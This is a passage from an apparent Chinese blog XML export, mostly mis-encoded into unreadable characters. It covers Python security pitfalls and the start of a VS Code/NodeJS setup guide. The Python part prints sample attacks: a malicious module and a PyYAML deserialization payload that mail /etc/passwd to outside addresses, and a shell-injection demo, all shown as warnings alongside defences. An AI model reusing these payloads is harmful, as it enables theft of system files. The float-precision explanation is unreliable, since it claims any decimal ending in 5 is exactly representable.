‰∏≠ÂÅöÁöÑÈÇ£Ê†∑„ÄÇÁ®ãÂ∫èÂëòÂøÖÈ°ª‰ΩøÁî®ÂÖ∂‰ªñÊâãÊÆµ‰ª•‰øùËØÅÊï∞ÊçÆ‰∏ÄËá¥ÊÄß„ÄÇ ‰∏çË¶Å‰ΩøÁî®isÊù•ÊØîËæÉintÂú®Êàë‰ª¨ÁöÑÂç∞Ë±°ÈáåÔºåintÊòØ‰∏çÂèØÂèòÂØπË±°ÔºåÊàë‰ª¨Êù•ÁúãÁúã‰∏ãÈù¢Ëøô‰∏™‰æãÂ≠ê12345678910&gt;&gt;&gt; a = 257&gt;&gt;&gt; b = 257&gt;&gt;&gt; a is bFalse&gt;&gt;&gt; a == bTrue&gt;&gt;&gt; a = 256&gt;&gt;&gt; b = 256&gt;&gt;&gt; a is bTrue ‰∏∫‰∫ÜÈÅøÂÖçÊØèÊ¨°ÁªôÁªèÂ∏∏‰ΩøÁî®Âà∞ËøôÈÉ®ÂàÜÊï¥Êï∞ÂàÜÈÖç‰∏Ä‰∏™Êñ∞ÁöÑÂÜÖÂ≠òÔºåPythonÈ¢ÑÂÖàÁîüÊàêÂπ∂ÁºìÂ≠òÂ•ΩËøô‰∫õÂ∏∏Áî®Êï¥Êï∞([-5, 257))ÔºåËøôÊ†∑ÁöÑÈ¢ÑÂ§ÑÁêÜÂèØ‰ª•Âä†Âø´Á®ãÂ∫èËøêË°åÊó∂ÊïàÁéáÔºåÊõ¥ËØ¶ÁªÜÁöÑ‰∫ÜËß£‰ºöÂú®‰ª•ÂêéÁöÑPythonÊï∞ÊçÆÁªìÊûÑÊ∫êÁ†ÅËß£ËØªÈÉ®ÂàÜÂÅö‰ªãÁªç„ÄÇÂõ†Ê≠§‰∏çË¶Å‰ΩøÁî®isÊØîËæÉÊï¥Êï∞Â§ßÂ∞èÔºåisÊòØÁî®‰∫éÊØîËæÉÊòØÂê¶‰∏∫Âêå‰∏ÄÂØπË±°ÁöÑÔºåisÊú¨Ë∫´ÊòØ‰∏çÊòØÁî®Êù•Âπ≤Ëøô‰ª∂‰∫ãÁöÑ„ÄÇ floatÁöÑËàçÂÖ•ÈóÆÈ¢òÂõ†‰∏∫ÂçÅËøõÂà∂ÁöÑÂ∞èÊï∞Âπ∂‰∏çËÉΩÁî®‰∫åËøõÂà∂Á≤æÁ°ÆÁöÑË°®ËææÂá∫Êù•, Âú®ÂçÅËøõÂà∂‰∏≠ÔºåËøõÂà∂ÁöÑÂü∫Êï∞ÊòØ10ÔºåËÄå5Ê≠£Â•ΩÊòØ10ÁöÑ‰∏ÄÂçä„ÄÇ 2ÁöÑ‰∏ÄÂçäÊòØÂ§öÂ∞ëÔºüÂΩìÁÑ∂ÊòØ1‰∫Ü„ÄÇ ÊâÄ‰ª•ÔºåÂçÅËøõÂà∂ÁöÑ0.5Â∞±ÊòØ‰∫åËøõÂà∂ÁöÑ0.1, ËÄåÂØπ‰∫é‰∫åËøõÂà∂Êù•ËØ¥ÔºåÂè™Êúâ0Âíå1ÁöÑÂèòÂåñÔºåÈÇ£‰πàÂè™Êúâ0.1Âíå0.0,ËøôÊ†∑‰ªÖËÉΩÁ≤æÁ°ÆË°®ËææÂçÅËøõÂà∂0.0Âíå0.5,‰Ω†‰ª•Ê≠§Á±ªÊé®ÔºåÈÇ£‰πà‰ºöÂèëÁé∞‰∏Ä‰∏™ÁªìËÆ∫ÔºöÂ¶ÇÊûú‰∏Ä‰∏™ÂçÅËøõÂà∂Êï∞ÂèØ‰ª•Áî®‰∫åËøõÂà∂Á≤æÁ°ÆË°®Á§∫ÔºåÈÇ£‰πàÂÆÉÁöÑÊúÄÂêé‰∏Ä‰ΩçËÇØÂÆöÊòØ5,ÊâÄ‰ª•Âè™Êúâ‰ª•5ÁªìÂ∞æÁöÑÂ∞èÊï∞ÊâçËÉΩË¢´Á≤æÁ°ÆÁöÑËÆ°ÁÆóÊàë‰ª¨ÁúãÁúã‰∏ãÈù¢‰∏Ä‰∏™ÊúâË∂£ÁöÑÁé∞Ë±°„ÄÇ1234567891011121314151617181920212223242526In [1]: 0.1 + 0.1Out[1]: 0.2In [2]: 0.1 + 0.1 + 0.1Out[2]: 0.30000000000000004In [3]: 0.1 + 0.1 + 0.1 + 0.1Out[3]: 0.4In [4]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[4]: 0.5In [5]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[5]: 0.6In [6]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[6]: 0.7In [7]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[7]: 0.7999999999999999In [8]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[8]: 0.8999999999999999In [9]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[9]: 0.9999999999999999 ÊàëÁúãÂà∞Êúâ‰ΩçÁΩëÂèãÁöÑÊèêÂá∫ÁöÑËß£ÂÜ≥ÊñπÊ°àÔºö ÊàëÊúâ‰∏Ä‰∏™ËßÇÁÇπÔºåÈíàÂØπÂ∞èÊï∞Á≤æÂ∫¶‰∏çÂ§üÁöÑÈóÆÈ¢òÔºà‰æãÂ¶Ç 0.1ÔºâÔºåËΩØ‰ª∂ÂèØ‰ª•‰∫∫‰∏∫ÁöÑÂú®Êï∞ÊçÆÊúÄÂêé‰∏Ä‰ΩçË°• 5Ôºå ‰πüÂ∞±ÊòØ 0.15ÔºåËøôÊ†∑Áâ∫Áâ≤‰∏Ä‰ΩçÔºå‰ΩÜÊòØÂèØ‰ª•‰øùËØÅÊï∞ÊçÆÁ≤æÂ∫¶ÔºåËøòÂéüÂÜçÊääÈÇ£‰∏™Â∞æÂ∑¥ 5 ÂéªÊéâ„ÄÇ1234567891011In [40]: 0.4 + 0.2Out[40]: 0.6000000000000001In [41]: (0.45 + 0.25) - (0.05 + 0.05)Out[41]: 0.In [49]: 0.6 + 0.3Out[49]: 0.8999999999999999In [50]: 0.65 + 0.35 - (0.05 + 0.05)Out[50]: 0.9 ÊúÄÂ•ΩÁöÑÂ§ÑÁêÜÊé™ÊñΩÊòØÂè™Ë¶ÅÊúâÂèØËÉΩÔºåÂ∞±ÂùöÊåÅÊï¥Êï∞ËøêÁÆó„ÄÇÊ¨°Â•ΩÁöÑÂ§ÑÁêÜÊé™ÊñΩÂèØËÉΩÊòØ‰ΩøÁî®decimalÊ®°ÂùóÔºåÂÆÉËØïÂõæ‰øùÊä§Áî®Êà∑ÂÖçÂèóÁêêÁ¢éÁªÜËäÇÂíåÂç±Èô©Áº∫Èô∑‰πãËã¶„ÄÇ ÁßÅÊúâÂ±ûÊÄßPython ‰∏çÊîØÊåÅÂØπË±°Â±ûÊÄßÈöêËóè, ÂèäÊó∂‰Ω†‰ΩøÁî®__Êù•‰øùÊä§‰Ω†ÁöÑÂèòÈáè(private),Âú®ÂÜÖÈÉ®Ôºåpython‰πü‰ªÖ‰ªÖÊòØÂ∞ÜÂÖ∂Âà´Âêç‰∫ÜËÄåÂ∑≤ÔºåËÄåËøô‰∏™Âà´ÂêçÁöÑÂä®‰ΩúÊòØÂú®Ëß£ÈáäÂô®Ë∞ÉÁî®typeÊù•ÂàõÂª∫classÊó∂ÊâßË°åÁöÑÁöÑ„ÄÇ123456789101112131415161718192021222324252627In [54]: class X(object): ...: def __init__(self): ...: self.__private = 1 ...: def get_private(self): ...: return self.__private ...: def has_private(self): ...: return hasattr(self, '__private') ...:In [55]: x = X()In [56]: x.has_private()Out[56]: FalseIn [57]: x.get_private()Out[57]: 1In [58]: x.__private = 2In [59]: x.__privateOut[59]: 2In [60]: hasattr(x, '__private')Out[60]: TrueIn [61]: x._X__privateOut[61]: 1 ÁÑ∂ÂêéÂ¶ÇÊûúÊàë‰ª¨ÂêéÈù¢Âä®ÊÄÅÊ∑ªÂä†ÁöÑÂ±ûÊÄßÔºåÈÇ£‰πàÊòØ‰∏ç‰ºöÊúâËøôÁßç‰øùÊä§ÁöÑ(Êó†ËΩ¨Êç¢ÂèëÁîü)12345In [62]: x.__privateOut[62]: 2In [63]: hasattr(x, '__private')Out[63]: True Â¶ÇÊûúÁ®ãÂ∫èÂëò‰æùËµñ‰∫éÂèå‰∏ãÂàíÁ∫øÂ±ûÊÄßÊù•Âú®‰ªñ‰ª¨ÁöÑ‰ª£Á†Å‰∏≠ÂÅöÂá∫ÈáçË¶ÅÂÜ≥ÂÆöÔºåËÄå‰∏çÂÖ≥Ê≥®ÁßÅÊúâÂ±ûÊÄßÁöÑ‰∏çÂØπÁß∞Ë°å‰∏∫ÔºåÈÇ£‰πàËøô‰∫õÂ∞èÊäÄÂ∑ß‰ºöÂèòÊàêÂÆâÂÖ®ÊºèÊ¥û Ê®°ÂùóÊâßË°åËØ≠Âè•ÂÆûÈôÖ‰∏ä‰ºöÂØºËá¥ÂØºÂÖ•ÁöÑÊ®°Âùó‰∏≠ÁöÑ‰ª£Á†ÅÁöÑÊâßË°åÔºåËøô‰∏Ä‰∫ãÂÆûÂπ∂‰∏çÊòéÊòæ„ÄÇËøôÂ∞±ÊòØ‰∏∫‰ªÄ‰πàÁîöËá≥ÂØºÂÖ•‰∏çÂèØ‰ø°Ê®°ÂùóÊàñÂåÖÊòØÊúâÈ£éÈô©ÁöÑ„ÄÇÂØºÂÖ•ÂÉèËøôÊ†∑ÁöÑÁÆÄÂçïÊ®°ÂùóÂèØËÉΩ‰ºöÂØºËá¥‰∏çÊÑâÂø´ÁöÑÁªìÊûúÔºö1234567891011$ cat malicious.pyimport osimport sysos.system('cat /etc/passwd | mail attacker@blackhat.com')del sys.modules['malicious'] # pretend it's not imported$ python&gt;&gt;&gt; import malicious&gt;&gt;&gt; dir(malicious)Traceback(most recent call last):NameError: name 'malicious' is not defined Áå¥Â≠êË°•‰∏ÅËøêË°åÊó∂‰øÆÊîπ Python ÂØπË±°Â±ûÊÄßÁöÑËøáÁ®ãÁß∞‰πã‰∏∫Áå¥Â≠êË°•‰∏Å ( monkey patching)„ÄÇ‰Ωú‰∏∫Âä®ÊÄÅËØ≠Ë®ÄÔºå Python ÂÆåÂÖ®ÊîØÊåÅËøêË°åÊó∂Á®ãÂ∫èËá™ÁúÅÂíå‰ª£Á†ÅÁ™ÅÂèò„ÄÇ‰∏ÄÊó¶‰ª•ÊüêÁßçÊñπÂºèÂØºÂÖ•‰∫Ü‰∏Ä‰∏™ÊÅ∂ÊÑèÊ®°ÂùóÔºåÈÇ£‰πà‰ªª‰ΩïÁé∞ÊúâÁöÑÂèØÂèòÂØπË±°ÂèØË¢´‰∏çÁü•‰∏çËßâÂú∞Âú®Ê≤°ÊúâÁ®ãÂ∫èÂëòÂêåÊÑèÁöÑÊÉÖÂÜµ‰∏ãË¢´ÊâìÁå¥Â≠êË°•‰∏Å„ÄÇÊîªÂáªËÄÖÂèØ‰ª•Âà©Áî® Python ÂûÉÂúæÂõûÊî∂Âô® ( gc.get_objects())Êù•ÊéåÊè°Áé∞ÊúâÁöÑÊâÄÊúâÂØπË±°ÔºåÂπ∂ÈªëËøõÂÆÉ‰ª¨‰∏≠‰ªªÊÑè‰∏Ä‰∏™„ÄÇ Python ÂØπË±°ÁöÑÁ±ªÂûãÊòØÁî± __class__ Â±ûÊÄßÂÜ≥ÂÆöÁöÑ„ÄÇÈÇ™ÊÅ∂ÁöÑÊîªÂáªËÄÖÂèØ‰ª•ÈÄöËøá‰æùÈù†ÊîπÂèòÊ¥ªÂä®ÂØπË±°ÁöÑÁ±ªÂûãÊù•‰ª§‰∫∫ÁªùÊúõÂú∞Êää‰∫ãÊÉÖÊêûÁ†∏Ôºö12345678910111213141516171819&gt;&gt;&gt; class X(object): pass...&gt;&gt;&gt; class Y(object): pass...&gt;&gt;&gt; x_obj = X()&gt;&gt;&gt; x_obj&lt;__main__.X object at 0x7f62dbe5e010 &gt;&gt;&gt;&gt; isinstance(x_obj, X)True&gt;&gt;&gt; x_obj.__class__ = Y&gt;&gt;&gt; x_obj&lt;__main__.Y object at 0x7f62dbe5d350 &gt;&gt;&gt;&gt; isinstance(x_obj, X)False&gt;&gt;&gt; isinstance(x_obj, Y)True&gt;&gt;&gt; ÂØπÊäóÊÅ∂ÊÑèÁå¥Â≠êË°•‰∏ÅÁöÑÂîØ‰∏ÄÂ§ÑÁêÜÊé™ÊñΩÊòØ‰øùËØÅÂØºÂÖ•ÁöÑ Python Ê®°ÂùóÁöÑÁúüÂÆûÊÄßÂíåÂÆåÊï¥ÊÄß, ‰∏Ä‰∏™ÁÆÄÂçïÁöÑÊñπÊ≥ïÊòØ‰ΩøÁî®__slot__Êù•‰øùÊä§Ëá™Â∑±ÁöÑÁ±ª‰∏çË¢´Ê≥®ÂÖ•ÊîªÂáª,‰ΩÜÊòØËøôÂèà‰∏ßÂ§±‰∫Ü‰∏Ä‰∫õÁÅµÊ¥ªÊÄß„ÄÇ ÈÄöËøásubprocessËøõË°åshellÊ≥®ÂÖ•‰ª•ËÉ∂Ê∞¥ËØ≠Ë®ÄËëóÁß∞ÔºåÂØπPythonËÑöÊú¨Êù•ËØ¥ÔºåÈÄöËøáËÆ©Êìç‰ΩúÁ≥ªÁªüÊù•ÊâßË°åÂÆÉ‰ª¨ÔºåÂèØËÉΩËøòÊèê‰æõÈ¢ùÂ§ñÁöÑÂèÇÊï∞ÔºåÊù•ÂßîÊ¥æÁ≥ªÁªüÁÆ°ÁêÜ‰ªªÂä°ÁªôÂÖ∂‰ªñÁ®ãÂ∫èÔºåÊòØÈùûÂ∏∏Â∏∏ËßÅÁöÑ„ÄÇsubprocessÊ®°Âùó‰∏∫ËøôÊ†∑ÁöÑ‰ªªÂä°Êèê‰æõ‰∫ÜÊòì‰∫é‰ΩøÁî®ÂíåÁõ∏ÂΩìÈ´òÂ±ÇÊ¨°ÁöÑÊúçÂä°„ÄÇ12345&gt;&gt;&gt; from subprocess import call&gt;&gt;&gt; call('date')2017Âπ¥ 1Êúà10Êó• ÊòüÊúü‰∫å 13Êó∂11ÂàÜ53Áßí CST0&gt;&gt;&gt; ‰ΩÜÊúâ‰∏Ä‰∏™Èô∑Èò±ÔºÅË¶ÅÂà©Áî®UNIX shellÊúçÂä°Ôºå‰æãÂ¶ÇÂëΩ‰ª§Ë°åÂèÇÊï∞Êâ©Â±ïÔºåcallÂáΩÊï∞ÁöÑshellÂÖ≥ÈîÆÂ≠óÂèÇÊï∞Â∫îËØ•ËÆæÁΩÆ‰∏∫True„ÄÇÁÑ∂ÂêéÂéüÊ†∑‰º†ÈÄícallÂáΩÊï∞ÁöÑÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ÁªôÁ≥ªÁªüshellÔºåÁî®‰ª•Ëøõ‰∏ÄÊ≠•ÁöÑËß£Êûê„ÄÇ‰∏ÄÊó¶Êó†ÊïàÁöÑÁî®Êà∑ËæìÂÖ•Âà∞ËææcallÂáΩÊï∞(ÊàñËÄÖÂÖ∂‰ªñÂú® subprocess Ê®°Âùó‰∏≠ÂÆûÁé∞ÁöÑÂáΩÊï∞)ÔºåÈÇ£‰πàÂ∞±‰ºöÂºÄÊîæ‰∏Ä‰∏™Âè£ÁªôÂ∫ïÂ±ÇÁ≥ªÁªüËµÑÊ∫ê„ÄÇ12345&gt;&gt;&gt; call('cut -d: -f1 /etc/passwd', shell=True)nobodyrootdaemon... ÊòæÁÑ∂ÔºåÂ∞ÜshellÂÖ≥ÈîÆÂ≠ó‰øùÊåÅÈªòËÆ§ÂÄºFalseÔºåÂπ∂‰∏îÊèê‰æõÂëΩ‰ª§ÂèäÂÖ∂ÂèÇÊï∞ÁöÑÊï∞ÁªÑÁªôsubprocessÂáΩÊï∞Ôºå‰∏çË¶Å‰∏∫Â§ñÈÉ®ÂëΩ‰ª§ÊâßË°åË∞ÉÁî®UNIX shellÔºåËøôÊ†∑‰ºöÂÆâÂÖ®ÂæóÂ§ö„ÄÇÂú®ËøôÁ¨¨‰∫åÊ¨°Ë∞ÉÁî®Ê†ºÂºèÔºåÂëΩ‰ª§ÊàñËÄÖÂÆÉÁöÑÂèÇÊï∞ÈÉΩ‰∏ç‰ºöË¢´shellËß£ÊûêÊàñÂ±ïÂºÄ„ÄÇÂ¶ÇÊûúÂ∫îÁî®ÁöÑÊú¨Ë¥®ÂÜ≥ÂÆö‰∫Ü‰ΩøÁî®UNIX shellÊúçÂä°ÔºåÈÇ£‰πàÊ∏ÖÁêÜ‰∏ÄÂàáÂà∞ subprocessÁöÑÂèÇÊï∞ÔºåÁ°Æ‰øùÊ≤°Êúâ‰∏çÊÉ≥Ë¶ÅÁöÑshellÂäüËÉΩÂèØ‰ª•Ë¢´ÊÅ∂ÊÑèÁî®Êà∑Âà©Áî®ÔºåËøôÂÆåÂÖ®ÊòØÈáçË¶ÅÁöÑ„ÄÇÂú®Êõ¥Êñ∞ÁöÑPythonÁâàÊú¨‰∏≠ÔºåÂèØ‰ª•Áî®Ê†áÂáÜÂ∫ìÁöÑshlex.quoteÂáΩÊï∞Êù•ËøõË°åshellËΩ¨‰πâ„ÄÇ Â∫èÂàóÂåñ-pyYAML‰Ωú‰∏∫‰∏Ä‰∏™ÊµÅË°åÁöÑÈÖçÁΩÆÊñá‰ª∂Ê†ºÂºèÔºåYAML‰∏ç‰∏ÄÂÆöË¢´ËÆ§‰∏∫ÊòØ‰∏Ä‰∏™ËÉΩÂ§üËØ±‰ΩøÂèçÂ∫èÂàóÂåñÂô®ÊâßË°å‰ªªÊÑè‰ª£Á†ÅÁöÑÂº∫Â§ßÁöÑÂ∫èÂàóÂåñÂçèËÆÆ„ÄÇËÆ©ÂÆÉÁîöËá≥Êõ¥Âç±Èô©ÁöÑÊòØÔºå‰∫ãÂÆû‰∏äPythonÁöÑYAMLÈªòËÆ§ÂÆûÁé∞‚Äî-PyYAMLËÆ©ÂèçÂ∫èÂàóÂåñÁúãËµ∑Êù•ÈùûÂ∏∏Êó†ËæúÔºö1234567&gt;&gt;&gt; dangerous_input = """... some_option: !!python/object/apply:subprocess.call... args: [cat /etc/passwd | mail 719118794@qq.com]... kwds: &#123;shell: true&#125;... """&gt;&gt;&gt; yaml.load(dangerous_input)&#123;'some_option': 0&#125; ËÄå/etc/passwdÂ∑≤ÁªèË¢´Á™ÉÂèñ‰∫Ü„ÄÇ‰∏Ä‰∏™Âª∫ËÆÆÁöÑËß£ÂÜ≥ÊñπÊ≥ïÊòØÊÄªÊòØ‰ΩøÁî® yaml.safe_loadÊù•Â§ÑÁêÜÈÇ£‰∫õ‰Ω†‰∏ç‰ø°‰ªªÁöÑYAMLÂ∫èÂàóÂåñ„ÄÇÂ∞ΩÁÆ°Â¶ÇÊ≠§ÔºåÁõÆÂâçÁöÑPyYAMLÈªòËÆ§ÊÑüËßâÊúâ‰∫õÈ©±‰Ωø‰∫∫ËÄÉËôëÂÖ∂‰ªñÂÄæÂêë‰∫é‰∏∫Áõ∏‰ººÁöÑÁõÆÁöÑ‰ΩøÁî® dump/ loadÂáΩÊï∞ÂêçÔºà‰ΩÜÊòØ‰ª•‰∏ÄÁßçÂÆâÂÖ®ÁöÑÊñπÂºèÁöÑÂ∫èÂàóÂåñÂ∫ì]]></content>
      <categories>
        <category>ÂºÄÂèëËØ≠Ë®Ä</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>python_tips</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[‰ΩøÁî®VSCodeÂø´ÈÄüÊê≠Âª∫NodeJSÂºÄÂèëÁéØÂ¢É]]></title>
    <url>%2F2017%2F01%2F01%2Fnodejs-vscode%2F</url>
    <content type="text"><![CDATA[ÊñáÊú¨ÁöÑÁõÆÁöÑÊòØÂø´ÈÄüÊê≠Âª∫NodeJSÁöÑÂºÄÂèëÁéØÂ¢ÉÔºåNodeJSÁöÑÂ∏∏ËßÅÁöÑÂºÄÂèëÊñπÂºèÊúâ2ÁßçÔºå‰∏ÄÁßçÊòØÁºñËæëÂô®Ôºå‰∏ÄÁßçÊòØIDE„ÄÇÁºñËæëÂô®Êé®Ëçê‰ΩøÁî®ÂæÆËΩØÂá∫ÂìÅÁöÑvscdoeÔºåÂõ†‰∏∫ÂÖ∂ÂêØÂä®ÈÄüÂ∫¶Âø´ÔºåËΩªÈáèÁ∫ßÔºåÊâßË°åÁÆÄÂçïÔºåË∞ÉËØïÊñπ‰æøÔºåËøòÊúâÁïåÈù¢ÊºÇ‰∫Æ„ÄÇËÄåIDE Êó†ÂèØÂéöÈùûÁöÑÂ∞±ÊòØWebStorm‰∫Ü„ÄÇËøôÈáå‰ΩøÁî®vscdoeÊê≠Âª∫ÂºÄÂèëÁéØÂ¢ÉÔºåÂõ†‰∏∫IDEÁúüÁöÑÊØîËæÉËÄóÂÜÖÂ≠ò„ÄÇÈô§ÈùûÂºÄÂèëÂ§ßÂûãÈ°πÁõÆ,Âê¶ÂàôËΩªÊòìÊàë‰∏çÂºÄIDE„ÄÇ VSCodeÁÆÄ‰ªãVSCodeÂÖ®Áß∞ÊòØVisual Studio Code, Áî±ÂæÆËΩØÂá∫ÂìÅ,‰ΩÜÂÆÉ‰∏çÊòØÈÇ£‰∏™Â§ßÂùóÂ§¥ÁöÑVisual Studio ,ÂÆÉÊòØ‰∏Ä‰∏™Á≤æÁÆÄÁâàÁöÑËø∑‰Ω†Visual StudioÔºåÂπ∂‰∏îÔºåVisual Studio CodeÂèØ‰ª•Ë∑®ÔºÅÂπ≥ÔºÅÂè∞ÔºÅWindows„ÄÅMacÂíåLinuxÈÄöÁî®„ÄÇ ÂÆâË£ÖVSCodeÂèØ‰ª•ÈÄöËøáÂÆòÊñπ‰∏ãËΩΩ, Áî±‰∫é‰Ω†ÊàëÈÉΩÊáÇÁöÑÂéüÂõ†ÔºåÂèØËÉΩÊó†Ê≥ïËÆøÈóÆÔºåÂõ†Ê≠§‰Ω†ÂèØËÉΩ‰ºöÈúÄË¶Å‰ΩøÁî®ÂõΩÂÜÖÈïúÂÉè,Áõ¥Êé•‰∏ãmacÁâàÊú¨ÁöÑÂÆâË£ÖÂåÖÔºåÂÆâË£Ö„ÄÇ ËøêË°åÂú®VS Code‰∏≠ÔºåÊàë‰ª¨ÂèØ‰ª•ÈùûÂ∏∏Êñπ‰æøÂú∞ËøêË°åJavaScriptÊñá‰ª∂„ÄÇ VS Code‰ª•Êñá‰ª∂Â§π‰Ωú‰∏∫Â∑•Á®ãÁõÆÂΩïÔºàWorkspace DirÔºâÔºåÊâÄÊúâÁöÑJavaScriptÊñá‰ª∂ÈÉΩÂ≠òÊîæÂú®ËØ•ÁõÆÂΩï‰∏ã„ÄÇÊ≠§Â§ñÔºåVS CodeÂú®Â∑•Á®ãÁõÆÂΩï‰∏ãËøòÈúÄË¶Å‰∏Ä‰∏™.vscodeÁöÑÈÖçÁΩÆÁõÆÂΩïÔºåÈáåÈù¢Â≠òÊîæÈáåVS CodeÈúÄË¶ÅÁöÑÈÖçÁΩÆÊñá‰ª∂„ÄÇ ÂÅáËÆæÊàë‰ª¨Ë¶ÅÂàõÂª∫‰∏Ä‰∏™helloÁöÑÂ∑•Á®ãÔºåÂõ†Ê≠§ÊàëÈúÄË¶Å‰∏Ä‰∏™helloÁöÑÁõÆÂΩï‰Ωú‰∏∫Â∑•Á®ãÁõÆÂΩïÔºåÁÑ∂ÂêéÂú®ÈáåÈù¢ÁºñÂÜôhello.jsÊñá‰ª∂ÔºåÂàôËØ•Â∑•Á®ãÁõÆÂΩïÁöÑÁªìÊûÑÂ¶Ç‰∏ãÔºö1234567hello/ &lt;-- workspace dir|+- hello.js &lt;-- JavaScript file|+- .vscode/ &lt;-- VS Code config | +- launch.json &lt;-- VS Code config file for JavaScript ÁÑ∂ÂêéÂàáÊç¢Âà∞debugÊ®°ÂºèËøõË°åËøêË°åÔºåÂÖ≥‰∫édebugÊ®°ÂºèÂêéÈù¢‰ªãÁªç„ÄÇÂØπ‰∫éÊõ¥ÁªÜËäÇÁõ∏ÂÖ≥ÁöÑÊñáÊ°£ÂèØ‰ª•ÂèÇËÄÉÂæÆËΩØÂÆòÊñπÊèê‰æõÁöÑJavaScript in VS Code Êô∫ËÉΩÊèêÁ§∫Âõ†‰∏∫‰πãÂâçÂæÆËΩØÊé®Âá∫‰∫ÜtypescriptËØ≠Ë®ÄÔºåÁªìÂêàtsdÊñá‰ª∂ÔºåÁî®visual studioÂÜôtypescript‰ª£Á†ÅÊòØÁõ∏ÂΩìÁàΩÁöÑÔºåÊô∫ËÉΩÊèêÁ§∫ÁöÑÂäüËÉΩÈùûÂ∏∏nb„ÄÇ Ëøô‰∏™ÂäüËÉΩÁêÜÊâÄÂ∫îÂΩì‰πüË¢´vscodeÁªßÊâø‰∫ÜÔºå‰ΩÜÊòØÁé∞Âú®tsdÈ°πÁõÆÂ∑≤ÁªèËøáÊúü‰∫ÜÔºåÊé•ËøáËøô‰∏™Êé•ÂäõÊ£íÁöÑÊòØtypings Âõ†Ê≠§Êàë‰ª¨Â∞ÜÈÄöËøáTypingsÊù•ÂÆûÁé∞JavaScriptÊô∫ËÉΩÊèêÁ§∫Âäü Ê≥®ÊÑè‰∫ãÈ°π ÂÆâË£ÖNPM NPMÊòØÂíåNode.js‰∏ÄËµ∑ÂÆâË£ÖÁöÑÔºåÂ¶ÇÊûú‰Ω†ÊÉ≥‰ΩøÁî®NPMÁöÑËØùÔºåÈÇ£‰πà‰Ω†Â∫îËØ•ÂÖàÂÆâË£ÖNode.js Typings vs TSD Typings‰Ωú‰∏∫TSDÁöÑÊõø‰ª£ËÄÖËÄåÂá∫Áé∞ÁöÑÔºåÂ¶ÇÊûú‰Ω†Â∑≤ÁªèÂÆâË£Ö‰∫ÜTSDÔºåÈÇ£‰πàÈúÄË¶ÅÁü•ÈÅìÁé∞Âú®TSDÂ∑≤Áªè‰∏çÊé®Ëçê‰ΩøÁî®‰∫Ü„ÄÇÂ¶ÇÊûúÂ∑≤ÁªèÂÆâË£ÖTSDËØ∑ÊâßË°å‰∏ãÈù¢ÁöÑÂëΩ‰ª§Êù•ÁßªÈô§ÂÆÉ1npm rm -g tsd CNPM Âú®ÂõΩÂÜÖÁî±‰∫éÂ¢ôÁöÑÂéüÂõ†ÔºåÂ§ßÈÉ®ÂàÜÊó∂ÂÄô‰ΩøÁî®NPMÂÆâË£ÖÊ®°ÂùóÁöÑÈÄüÂ∫¶‰∏ä‰ºöÂæàÊÖ¢ÔºåËøôÊó∂ÂÄôÊàë‰ª¨ÂÖ∂ÂÆûÂèØ‰ª•ÈÄâÊã©ÂõΩÂÜÖÊ∑òÂÆùÁöÑNPMÈïúÂÉèÔºåÂÖ≥‰∫éÊ∑òÂÆùNPMÈïúÂÉèÁöÑ‰ΩøÁî®ÊñπÊ≥ïÂèØ‰ª•ÂèÇËÄÉÊ∑òÂÆù NPM ÈïúÂÉè ‰ΩøÁî®‰∏ãÈù¢ÁöÑÂëΩ‰ª§Êù•ËøõË°åÂÆâË£ÖÂíå‰ΩøÁî®12npm install -g cnpm --registry=https://registry.npm.taobao.orgcnpm install koa ÂÆâË£ÖTypingsÊàë‰ª¨ÈÄöËøácnpmÊù•ÂÆâË£Ötypings1234maojun@maojun-mbp$ npm install -g typingsmaojun@maojun-mbp$ typings -v2.0.0 ÈÖçÁΩÆÊô∫ËÉΩÊèêÁ§∫ÂÆâË£ÖÂÆåÊàêÂêéÔºåÊàë‰ª¨ÈúÄË¶ÅÂÆâË£ÖÁõ∏Â∫îÁöÑÈúÄË¶ÅÊèêÁ§∫ÂäüËÉΩÂ∫ìÊàñËÄÖÊ°ÜÊû∂ÁöÑÁ±ªÂûã‰ø°ÊÅØÊñá‰ª∂ÔºåÂú®ËøôÈáåÊàë‰ª¨Êñ∞Âª∫‰∏Ä‰∏™Êñá‰ª∂Â§π NodeSnippetÔºå‰∏∫‰∫Ü‰∫ÜËß£TypingsÁöÑ‰ΩøÁî®ÊñπÊ≥ïÔºå‰Ω†ÂèØËÉΩÈúÄË¶ÅÁÆÄÂçïÁúãÁúãtypings github ‰ΩøÁî®ÂëΩ‰ª§Ë°åËøõÂÖ•Âà∞ËØ•ÁõÆÂΩï‰∏≠ÔºåÂàÜÂà´ËæìÂÖ•‰∏ãÈù¢‰∏§‰∏™ÂëΩ‰ª§Êù•ÂÆâË£ÖNodeÂíåLodashÁöÑÁ±ªÂûãÊé•Âè£‰ø°ÊÅØÊñá‰ª∂Ôºö12typings install dt~node --global --savetypings install lodash --save ËøôÊó∂ÂÄôÊàë‰ª¨ÂèØ‰ª•ÁúãÂà∞Êàë‰ª¨ÁöÑ NodeSnippetÁõÆÂΩï‰∏≠Â§ö‰∫Ü‰∏Ä‰∫õÊñá‰ª∂Ôºö12345678910111213 maojun@maojun-mbp$ tree ..‚îú‚îÄ‚îÄ typings‚îÇ ‚îú‚îÄ‚îÄ globals‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ node‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ index.d.ts‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ typings.json‚îÇ ‚îú‚îÄ‚îÄ index.d.ts‚îÇ ‚îî‚îÄ‚îÄ modules‚îÇ ‚îî‚îÄ‚îÄ lodash‚îÇ ‚îú‚îÄ‚îÄ index.d.ts‚îÇ ‚îî‚îÄ‚îÄ typings.json‚îî‚îÄ‚îÄ typings.json 